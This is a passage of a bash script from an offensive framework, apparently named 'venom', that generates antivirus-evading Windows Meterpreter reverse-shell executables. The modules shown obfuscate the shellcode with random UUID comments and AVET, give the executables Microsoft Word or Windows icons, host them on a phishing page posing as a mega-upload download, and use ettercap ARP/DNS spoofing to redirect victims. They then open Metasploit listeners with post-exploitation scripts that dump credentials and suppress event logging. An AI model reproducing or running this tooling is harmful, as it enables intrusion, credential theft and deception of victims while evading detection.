    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else


  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# -----------------------------------------------------
# C - PYTHON to EXE shellcode (SSL/TLS eavesdrop)
# ------------------------------------------------------
sh_shellcode23 () {
# run module or abort ? 
QuE=$(zenity --question --title="☠ UUID random keys evasion ☠" --text "Author: r00t-3xp10it | null-byte\nAdding ramdom comments into sourcecode\nwill help evading AVs signature detection (@nullbite)\n'a computer can never outsmart a always changing virus'\n\nRun uuid module?" --width 370) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 260) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: SSLbinary" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="SSLbinary";fi

echo "[☠] Loading uuid(@nullbyte) obfuscation module .."
sleep 1
echo "[☠] Building shellcode -> C,SSL/TLS format .."
sleep 2
echo "[☠] meterpreter over SSL sellected .."
sleep 1
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C,SSL/TLS -> WINDOWS(EXE)
    PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
# https://nodistribute.com/result/0DGFYgWdtaKuv8NzMiqAwJIQfmBy (2/39) py raw
# https://nodistribute.com/result/BunD148C79GOQkxj0g2deHqI (3/39) py exe
# https://nodistribute.com/result/LDynoZOq9A5TeBMYFW4k (2/39) nullbite obfuscation
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport PayloadUUIDTracking=true HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --smallest -f c | tr -d '\"' | tr -d '\n' | more > $IPATH/output/chars.raw"


echo ""
# strip bad caracters and store shellcode 
store=`cat $IPATH/output/chars.raw | awk {'print $5'} | cut -d ';' -f1`
# display generated code
cat $IPATH/output/chars.raw
echo "" && echo "" && echo ""
sleep 2


   # check if chars.raw as generated
   if [ -e "$IPATH/output/chars.raw" ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


#
# Template ramdom keys ..
# HINT: adding ramdom comments to sourcecode
# will help evading AVs signature detection (nullbite) 
# "a computer can never outsmart a always changing virus" 
#
NEW_UUID_1=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_2=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
NEW_UUID_3=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $UUID_RANDOM_LENGTH | head -n 1)
#
# pyinstaller does not accept numbers in funtion names (compiling), so we use only leters ..
#
NEW_UUID_4=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
NEW_UUID_5=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 11 | head -n 1)
NEW_UUID_6=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 12 | head -n 1)


#
# Build python Template (random UUID keys)
#
cd $IPATH/output
echo "[☠] build -> template.py"
sleep 1
echo "[✔] Using random UUID keys (evade signature detection)"
sleep 1
#
# display generated keys to user
#
echo ""
echo "    Generated key:$NEW_UUID_3"
sleep 1
echo "    Generated key:$NEW_UUID_4"
sleep 1
echo "    Generated key:$NEW_UUID_5"
sleep 1
echo "    Generated key:$NEW_UUID_1"
sleep 1
echo "    Generated key:$NEW_UUID_2"
sleep 1
echo ""
sleep 1



echo "#!/usr/bin/python" > template.py
echo "# -*- coding: utf-8 -*-" >> template.py
echo "# $NEW_UUID_1" >> template.py
echo "from ctypes import *" >> template.py
echo "# $NEW_UUID_2" >> template.py
echo "$NEW_UUID_3 = (\"$store\");" >> template.py
echo "# gdGtdfASsTmFFsGbaaUnaDtaAvAaTkDKsHFdtGaAGmDoTkEkoT" >> template.py
echo "$NEW_UUID_4 = create_string_buffer($NEW_UUID_4, len($NEW_UUID_4))" >> template.py
echo "# GSMsdMfhmDjkGjDhMhhMfdsAsasAffWgUkhWWjWjGfdOgEEjue" >> template.py
echo "$NEW_UUID_5 = cast($NEW_UUID_5, CFUNCTYPE(c_void_p))" >> template.py
echo "# HdFDgFDttPkSMcSsFSKaWdBfDBmkSkOSiBewSDoFtLmDeWsKvG" >> template.py
echo "$NEW_UUID_5()" >> template.py
sleep 2

     # check if pyinstaller its installed
     if [ -d $DrIvC/$PiWiN ]; then
       # compile python to exe
       echo "[☠] pyinstaller -> found!"
       sleep 2
       echo "[☠] compile template.py -> $N4m.exe"
       sleep 2
       cd $IPATH/output

# chose executable final icon (.ico)
iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1

       #
       # pyinstaller backend appl
       #
       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/template.py'"
       cp $IPATH/output/dist/template.exe $IPATH/output/$N4m.exe
       rm $IPATH/output/*.spec > /dev/null 2>&1
       rm $IPATH/output/*.log > /dev/null 2>&1
       rm -r $IPATH/output/dist > /dev/null 2>&1
       rm -r $IPATH/output/build > /dev/null 2>&1
     else
      echo "[☠] pyinstaller not found .."
      exit
     fi


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ------------------------------
# C - AVET to EXE shellcode  FUD 
# ------------------------------
sh_shellcode24 () {
# run module or abort ? 
QuE=$(zenity --question --title="☠ AVET AV evasion ☠" --text "Author: Daniel Sauder\nThis module uses AVET to obfuscate\nthe sourcecode (evade AV detection)\n\nRun avet module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
#
# Check if dependencies are installed ..
# check if MinGw EXE exists ..
#
which mingw-gcc > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo "[☠] MinGw EXE compiler found .."
  sleep 2
else
  echo "[x] MinGw EXE compiler not found .."
  sleep 2
    #
    # check if files/directory exist ..
    #
    if [ -e "/usr/bin/mingw-gcc" ]; then
      rm /usr/bin/mingw-gcc > /dev/null 2>&1
    fi
    if [ -d "$DrIvC/MinGW" ]; then
      rm -r $DrIvC/MinGW > /dev/null 2>&1
    fi
    echo "[☠] Installing MinGw EXE compiler .."
    cd $IPATH/obfuscate/
    xterm -T "Donwloading MinGw EXE compiller" -geometry 124x26 -e "wget https://downloads.sourceforge.net/project/mingw/Installer/mingw-get-setup.exe"
    xterm -T "Installing MinGw EXE compiller" -geometry 124x26 -e "$arch mingw-get-setup.exe"
  #
  # Building minGW diectory ..
  #
  echo "#!/bin/sh" >> /usr/bin/mingw-gcc
  echo "cd $DrIvC/MinGW/bin" >> /usr/bin/mingw-gcc
  echo "exec wine gcc.exe \"\$@\"" >> /usr/bin/mingw-gcc
  chmod +x /usr/bin/mingw-gcc
  echo "[✔] Done installing MinGW .."
  rm mingw-get-setup.exe > /dev/null 2>&1
  cd $IPATH/
  sleep 2
fi
#
# Install avet obfuscated software ..
#
if [ -e "$IPATH/obfuscate/avet/make_avet" ]; then
  echo "[☠] avet obfuscator found .."
  sleep 2
else
  echo "[x] avet obfuscator not found .."
  sleep 2
  echo "[☠] Installing avet software .."
  sleep 1
    #
    # build avet ..
    #
    if [ -d $IPATH/obfuscate/avet ]; then
      rm -r $IPATH/obfuscate/avet > /dev/null 2>&1
    fi
    cd $IPATH/obfuscate/
    xterm -T "Installing avet software" -geometry 124x26 -e "git clone https://github.com/govolution/avet.git && sleep 2"
  #
  # Build avet files ..
  #
  cd $IPATH/obfuscate/avet
  gcc make_avet.c -o make_avet
  gcc sh_format.c -o sh_format
  echo "[✔] Done installing avet .."
  sleep 2
  cd $IPATH/
fi


#
# Get user input to build shellcode ..
#
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
interactions=$(zenity --title="☠ Enter ENCODER interactions ☠" --text "example: 3" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 290) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: AvetPayload" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="AvetPayload";fi
if [ -z "$interactions" ]; then interactions="3";fi

echo "[☠] Building shellcode -> C format .."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : C -> WINDOWS(EXE)
    PAYLOAD : $paylo

!
#
# Use metasploit to build shellcode (msf encoded)
# https://nodistribute.com/result/YCHgomiEkJrI3BcbtjvGsuexKVp842 (3/39) with -i 3
# https://nodistribute.com/result/ENZ1b6R2TrYocWHCzy9fwMuQs (0/39) FUD with -F -E
#
  if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
    xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c -o $IPATH/obfuscate/avet/template.txt"
  else
    xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i $interactions -f c -o $IPATH/obfuscate/avet/template.txt"
  fi

echo ""
# display generated code
cat $IPATH/obfuscate/avet/template.txt
echo "" && echo ""
sleep 2


# EDITING/BACKUP FILES NEEDED
echo "[☠] Editing/backup files .."
sleep 2


#
# We can reuse the template.txt from the previous example for decoding the shellcode:
#
echo "[☠] Decoding shellcode with avet .."
sleep 2
cd $IPATH/obfuscate/avet
if [ -e "$IPATH/obfuscate/avet/defs.h" ]; then
  rm $IPATH/obfuscate/avet/defs.h > /dev/null 2>&1
fi
#
# (decoding/obfuscation)
#
xterm -T "DECODING/OBFUSCATING SOURCECODE" -geometry 110x20 -e "./format.sh template.txt > scclean.txt && sleep 2"
rm $IPATH/obfuscate/avet/template.txt
mv scclean.txt template.txt
echo "[☠] Obfuscating shellcode with avet .."
sleep 1

  if [ "$paylo" = "windows/x64/meterpreter/reverse_tcp" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
    ./make_avet -f template.txt -X -F -E
  else
    ./make_avet -f template.txt -F -E
  fi
echo "[☠] Compiling shellcode to exe .."
sleep 2
# gcc $IPATH/obfuscate/avet/avet.c -o $IPATH/output/$N4m.exe
sudo mingw-gcc -o $IPATH/output/$N4m.exe $IPATH/obfuscate/avet/avet.c
cd $IPATH/
sleep 2


#
# CHOSE HOW TO DELIVER YOUR PAYLOAD
#
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 220) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T "PAYLOAD MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.exe|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.exe|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.exe $ApAcHe/$N4m.exe
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
